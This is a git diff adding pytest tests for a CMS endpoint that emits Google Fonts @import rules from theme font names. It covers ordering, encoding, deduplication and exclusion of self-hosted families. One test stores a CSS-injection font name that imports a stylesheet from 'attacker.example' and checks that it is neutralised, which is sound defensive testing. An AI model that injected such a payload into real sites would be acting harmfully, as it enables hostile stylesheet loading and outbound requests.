@@ -29,6 +29,17 @@ def _published(**colors):
     )
 
 
+def _published_fonts(**families):
+    db.cms_theme.update_one(
+        {"doc_id": "theme_current"},
+        {"$set": {f"published.fonts.{k}": v for k, v in families.items()}},
+    )
+
+
+def _current_fonts():
+    return dict(db.cms_theme.find_one({"doc_id": "theme_current"})["published"].get("fonts") or {})
+
+
 def _css():
     r = requests.get(f"{API}/cms/theme.css", timeout=TIMEOUT)
     assert r.status_code == 200, r.text
@@ -161,3 +172,81 @@ class TestTheNavSize:
         same fallback, so the two agree either way."""
         self._unset()
         assert "--nav-size: 11px;" in _css().text
+
+
+class TestItAsksGoogleForTheFamiliesGoogleHasToServe:
+    """The five seconds this endpoint took off the first paint.
+
+    The theme names its families, and until this existed the browser only learned them
+    from JavaScript: the app booted, ThemeLoader fetched /cms/theme as JSON, applyTheme
+    called ensureFontLoaded, and only then was a <link> to Google appended. Measured on
+    the beta deploy, the request for the site's own display face started at t=5117ms.
+
+    This stylesheet is render-blocking and already knows the name, so it asks.
+    """
+
+    def setup_method(self):
+        self._before = _current_fonts()
+
+    def teardown_method(self):
+        db.cms_theme.update_one(
+            {"doc_id": "theme_current"}, {"$set": {"published.fonts": self._before}}
+        )
+
+    def test_a_google_family_is_imported(self):
+        _published_fonts(display="Archivo")
+        body = _css().text
+        assert "fonts.googleapis.com/css2?family=Archivo" in body
+
+    def test_the_import_comes_before_any_rule(self):
+        """CSS drops an @import that follows a rule, so the position IS the feature."""
+        _published_fonts(display="Archivo")
+        body = _css().text
+        assert body.lstrip().startswith("@import"), body[:120]
+        assert body.index("@import") < body.index(":root:root")
+
+    def test_a_space_in_the_name_survives_as_a_url(self):
+        _published_fonts(display="Space Grotesk")
+        body = _css().text
+        # Encoded, not raw: a bare space would end the url() token early.
+        assert "family=Space%20Grotesk" in body
+        assert "family=Space Grotesk" not in body
+
+    def test_the_self_hosted_families_are_never_asked_for(self):
+        """index.css already carries Manrope and IBM Plex Mono from @fontsource, and
+        Google does not serve Clash Display at all — asking 404s."""
+        _published_fonts(display="Clash Display", body="Manrope", mono="IBM Plex Mono")
+        body = _css().text
+        assert "fonts.googleapis.com" not in body
+
+    def test_one_import_per_family_rather_than_one_combined_request(self):
+        """Google's CSS2 API fails the WHOLE request when any single family in it is
+        unknown. Combined, one bad name in the CMS would strip the type off the site."""
+        _published_fonts(display="Archivo", body="Inter", mono="Roboto Mono")
+        body = _css().text
+        assert body.count("@import") == 3
+
+    def test_a_family_named_twice_is_asked_for_once(self):
+        _published_fonts(display="Archivo", body="Archivo", mono="Archivo")
+        assert _css().text.count("@import") == 1
+
+    def test_the_weights_match_what_the_js_path_asks_for(self):
+        """Identical URLs, so the <link> ensureFontLoaded still appends is served from
+        cache rather than fetching a second, differently-weighted copy."""
+        _published_fonts(display="Archivo")
+        assert "wght@300;400;500;600;700;800;900&display=swap" in _css().text
+
+    def test_a_name_that_could_not_be_a_family_is_never_turned_into_a_request(self):
+        """FAMILY_RE gates the URL, the same way it gates an upload's family name.
+
+        The name still appears in the `--font-display` declaration, where _css_value has
+        stripped the quote, the colon, the semicolon and the @ that would be needed to
+        break out of the string — so it sits there as inert text. That is the existing,
+        checked behaviour of the declaration path. What must not happen is this endpoint
+        turning an editor's field into an outbound request, which is what an @import is.
+        """
+        _published_fonts(display='Evil"); @import url("//attacker.example/x.css")')
+        body = _css().text
+        assert "@import" not in body
+        # Inert inside the quoted value, and specifically not a second rule.
+        assert 'url("//attacker.example' not in body
